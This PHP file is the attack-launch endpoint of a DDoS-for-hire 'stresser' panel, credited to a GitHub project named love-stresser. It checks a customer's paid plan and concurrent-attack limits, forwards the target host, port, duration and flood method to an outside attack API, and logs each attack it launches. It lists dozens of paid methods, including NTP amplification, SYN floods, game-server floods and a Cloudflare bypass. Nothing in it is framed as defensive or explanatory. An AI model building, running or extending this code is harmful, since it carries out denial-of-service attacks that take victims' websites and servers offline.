<?php
// Made by Meandoyou and StingAving https://github.com/g0k1/love-stresser
function is_browser_request() {
    return !isset($_SERVER['HTTP_USER_AGENT']) || empty($_SERVER['HTTP_USER_AGENT']);
}

if (is_browser_request()) {
    header('Location: ../../../home');
    exit;
}
include("../../componements/php/root_domain.php");
$allowedReferrer = $root_domain;
if (isset($_SERVER['HTTP_REFERER']) && parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) !== $allowedReferrer) {
    header('HTTP/1.1 403 Forbidden');
    echo 'Access denied.';
    exit;
}

$ip = isset($_GET['host']) ? $_GET['host'] : '';
$port = isset($_GET['port']) ? $_GET['port'] : '';
$time = isset($_GET['time']) ? intval($_GET['time']) : 0;
$method = isset($_GET['method']) ? $_GET['method'] : '';
$userToken = isset($_GET['token']) ? $_GET['token'] : '';
$fulllog = isset($_GET['fulllog']) ? intval($_GET['fulllog']) : 0;
$requestMethod = isset($_GET['request_method']) ? $_GET['request_method'] : '';
$postData = isset($_GET['postdata']) ? $_GET['postdata'] : '';

if (empty($userToken) && isset($_COOKIE['LS_ASP'])) {
    $userToken = $_COOKIE['LS_ASP'];
}

include("../../componements/php/api_token.php");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $ip = isset($_POST['ip']) ? $_POST['ip'] : $ip;
    $port = isset($_POST['port']) ? $_POST['port'] : $port;
    $time = isset($_POST['time']) ? intval($_POST['time']) : $time;
    $method = isset($_POST['method']) ? $_POST['method'] : $method;
}

$log = "";

if ($fulllog) $log .= "Parameters received: IP={$ip}, Port={$port}, Time={$time}, Method={$method}, UserToken={$userToken}, RequestMethod={$requestMethod}\n";

if (empty($ip) || empty($port) || empty($method) || $time <= 0 || empty($userToken)) {
    header('Content-Type: application/json');
    $response = ['status' => 'false', 'message' => 'Invalid input parameters.'];
    if ($fulllog) $log .= "Error: Invalid input parameters.\n";
    echo json_encode($response);
    if ($fulllog) echo "\nLog:\n" . $log;
    exit;
}

include("../../componements/php/database_conn.php");

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
    header('Content-Type: application/json');
    $response = ['status' => 'false', 'message' => 'Connection failed: ' . $conn->connect_error];
    if ($fulllog) $log .= "Error: Connection failed: " . $conn->connect_error . "\n";
    echo json_encode($response);
    if ($fulllog) echo "\nLog:\n" . $log;
    exit;
}

$parsedUrl = parse_url($ip, PHP_URL_HOST);
if (!$parsedUrl) {
    $parsedUrl = $ip;
}

$sql = "SELECT host FROM blacklist";
$result = $conn->query($sql);

$blacklisted = false;
while ($row = $result->fetch_assoc()) {
    $blacklistedHost = $row['host'];
    if (stripos($parsedUrl, $blacklistedHost) !== false) {
        $blacklisted = true;
        break;
    }
}

$sql = "SELECT plan, concurents, rank FROM users WHERE token = ?";
$stmt = $conn->prepare($sql);
$stmt->bind_param("s", $userToken);
$stmt->execute();
$result = $stmt->get_result();

if ($result->num_rows === 0) {
    header('Content-Type: application/json');
    $response = ['status' => 'false', 'message' => 'User not found.'];
    if ($fulllog) $log .= "Error: User not found.\n";
    echo json_encode($response);
    if ($fulllog) echo "\nLog:\n" . $log;
    exit;
}

$user = $result->fetch_assoc();
$userPlan = $user['plan'];
$userConcurents = intval($user['concurents']);
$userRank = $user['rank'];

if ($userRank !== 'admin' && $userRank !== 'owner') {
    $fulllog = 0;
}

if ($blacklisted && $userRank !== 'owner') {
    header('Content-Type: application/json');
    $response = ['status' => 'false', 'message' => "Nah, you're not doing it! (Blacklisted Host)"];
    if ($fulllog) $log .= "Error: Blacklisted Host.\n";
    echo json_encode($response);
    if ($fulllog) echo "\nLog:\n" . $log;
    exit;
}

$sql = "DELETE FROM attacks WHERE end_time <= NOW()";
$conn->query($sql);

$paidMethods = [
    "NTP", "MIXAMP", "SADP", "UDP-PPS", "UDP-BYPASS", "UDP-VSE",
    "TEAMSPEAK3", "DISCORD", "TCPACK", "TCP-SYN", "TCP-TLS", "TCP-MIX",
    "TCPTFO", "TCP-BYPASS", "OVH-TCP", "SOCKET", "GAME-RUST", "GAME-AMONGUS",
    "GAME-WARZONE", "GAME-FORTNITE", "GAME-OVERWATCH", "GAME-FIVEM-UDP",
    "GAME-FIVEM-TCP", "GAME-MTA", "GAME-PUBG", "GAME-R6", "HTTP-RAW", "TLS",
    "HTTP-BROWSER", "HTTP-NEMESIS", "HTTP-IPV4", "XLDAP", "SSDP", "WSD", "ARD", "VSE", "STORM", "UDPQUERY", "SYNACK"
];

if ($userPlan === 'free' && in_array($method, $paidMethods)) {
    header('Content-Type: application/json');
    $response = ['status' => 'false', 'message' => 'Paid methods are not allowed for free plan users.'];
    if ($fulllog) $log .= "Error: Paid methods are not allowed for free plan users.\n";
    echo json_encode($response);
    if ($fulllog) echo "\nLog:\n" . $log;
    exit;
}

$allowedPlansForCloudBypass = ['starter1', 'starter2', 'starter3', 'exp1', 'exp2', 'exp3','pro1', 'pro2', 'pro3', 'infinity'];
if ($method === 'CLOUD-BYPASS' && !in_array($userPlan, $allowedPlansForCloudBypass)) {
    header('Content-Type: application/json');
    $response = ['status' => 'false', 'message' => 'Paid methods are not allowed for your ' . $userPlan . ' plan.'];
    if ($fulllog) $log .= "Error: Paid+ methods are not allowed for your {$userPlan} plan.\n";
    echo json_encode($response);
    if ($fulllog) echo "\nLog:\n" . $log;
    exit;
}

$sql = "SELECT COUNT(*) AS running_attacks FROM attacks WHERE user_token = ? AND end_time > NOW()";
$stmt = $conn->prepare($sql);
$stmt->bind_param("s", $userToken);
$stmt->execute();
$result = $stmt->get_result();
$row = $result->fetch_assoc();
$runningAttacks = intval($row['running_attacks']);

if ($userConcurents !== 0 && $runningAttacks >= $userConcurents) {
    header('Content-Type: application/json');
    $response = ['status' => 'false', 'message' => "All your concurents are in use! ({$runningAttacks}/{$userConcurents})"];
    if ($fulllog) $log .= "Error: All concurrents are in use ({$runningAttacks}/{$userConcurents}).\n";
    echo json_encode($response);
    if ($fulllog) echo "\nLog:\n" . $log;
    exit;
}

function is_valid_ip($ip) {
    return filter_var($ip, FILTER_VALIDATE_IP) !== false;
}

$apiEndpoint = is_valid_ip($ip) ? 'layer4' : 'layer7';

$apiUrl = "https://api.cloudnode.me/?hub={$apiEndpoint}&token={$token}&host={$ip}&port={$port}&time={$time}&method={$method}&vip=1";

if ($method === 'CLOUD-BYPASS') {
    $apiUrl = "https://api.cloudnode.me/?hub=layer7_premium&token={$token}&host={$ip}&port={$port}&time={$time}&method={$method}&postdata=&cookie=&referer=&mode=mix&rps=100&geo=worldwide&type={$requestMethod}&vip=1";
    
    if ($requestMethod === 'POST' && !empty($postData)) {
        $apiUrl .= "&postdata=" . urlencode($postData);
    }
}

if ($fulllog) $log .= "API URL: {$apiUrl}\n";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $apiUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
$response = curl_exec($ch);

$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

$responseData = [
    'status' => 'false',
    'message' => 'An error occurred.',
    'http_code' => $http_code,
    'response' => $response
];

if (!curl_errno($ch)) {
    if ($http_code == 200) {
        $responseData = json_decode($response, true);

        if (isset($responseData['success']) || (isset($responseData['message']) && $responseData['message'] === "Attack executed successfully")) {
            $responseData['status'] = 'true';

            $idFile = 'id_count.txt';

            if (!file_exists($idFile)) {
                file_put_contents($idFile, '0');
            }
            $currentId = (int)file_get_contents($idFile);
            $newId = $currentId + 1;
            file_put_contents($idFile, $newId);

            $responseData['id'] = $newId;

            $startTime = date('Y-m-d H:i:s');
            $endTime = date('Y-m-d H:i:s', strtotime("+$time seconds"));
            $createdAt = date('Y-m-d H:i:s');

            $sql = "INSERT INTO attacks (id, user_token, ip, port, method, start_time, end_time, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)";
            $stmt = $conn->prepare($sql);
            $stmt->bind_param("isssssss", $newId, $userToken, $ip, $port, $method, $startTime, $endTime, $createdAt);
            $stmt->execute();
            $stmt->close();

            if ($fulllog) $log .= "Attack scheduled successfully. ID: {$newId}\n";
        } else if (isset($responseData['error']) && ($responseData['error'] === 'Maximum Concurrents Reached.' || $responseData['error'] === 'ERROR: Maximum Concurrents Reached.')) {
            $responseData = [
                'status' => 'false',
                'message' => 'All our concurrents are in use!'
            ];
            if ($fulllog) $log .= "Error: Maximum Concurrents Reached.\n";
        } else if (isset($responseData['error']) && ($responseData['error'] === 'ERROR: Host is blacklisted' || $responseData['error'] === 'Host is blacklisted' | $responseData['error'] === 'Site is blacklisted.')) {
            $responseData = [
                'status' => 'false',
                'message' => "Nah, you're not doing it! (Blacklisted Host)"
            ];
            if ($fulllog) $log .= "Error: Host is blacklisted.\n";
        } else if (isset($responseData['error']) && (
            $responseData['error'] === 'Please wait a few seconds between each attack.' ||
            $responseData['error'] === 'Please wait a couple seconds between each attack.'
        )) {
            $responseData = [
                'status' => 'false',
                'message' => "Please wait a few seconds"
            ];
            if ($fulllog) $log .= "Please wait a few seconds.\n";
        }
            else if (isset($responseData['error']) && ($responseData['error'] === 'Premium API now has an attack limit of 600 seconds. This is a bypass and should not be used for longer durations..')) {
                $responseData = [
                    'status' => 'false',
                    'message' => "Premium API now has an attack limit of 600 seconds. Please wait 24 hours"
                ];
                if ($fulllog) $log .= "Error: Host is blacklisted.\n";
        } else if (isset($responseData['error']) && $responseData['error'] === 'Cooldown in progress... Please wait!') {
            $responseData = [
                'status' => 'false',
                'message' => 'Please wait before making another request.'
            ];
            if ($fulllog) $log .= "Error: Cooldown in progress.\n";
        } 
        else if (isset($responseData['error'])) {
            $responseData = [
                'status' => 'false',
                'message' => $responseData['error']
            ];
            if ($fulllog) $log .= "An error occurred: " . $responseData['error'] . "\n";
        }
        
    } else if ($http_code == 403) {
        $responseData = [
            'status' => 'false',
            'message' => '403 Forbidden: Cloudflare CAPTCHA is blocking the request.'
        ];
        if ($fulllog) $log .= "Error: Cloudflare CAPTCHA blocking request.\n";
    }
} else {
    $responseData = [
        'status' => 'false',
        'message' => 'cURL error: ' . curl_error($ch)
    ];
    if ($fulllog) $log .= "Error: cURL error: " . curl_error($ch) . "\n";
}

$finalResponse = [];

if (isset($responseData['status'])) {
    $finalResponse['status'] = $responseData['status'];
}

if (isset($responseData['message'])) {
    $finalResponse['message'] = $responseData['message'];
}

if (isset($responseData['id'])) {
    $finalResponse['id'] = $responseData['id'];
}

header('Content-Type: application/json');
echo json_encode($finalResponse);

if ($fulllog) echo "\nLog:\n" . $log;

curl_close($ch);
$conn->close();
?>
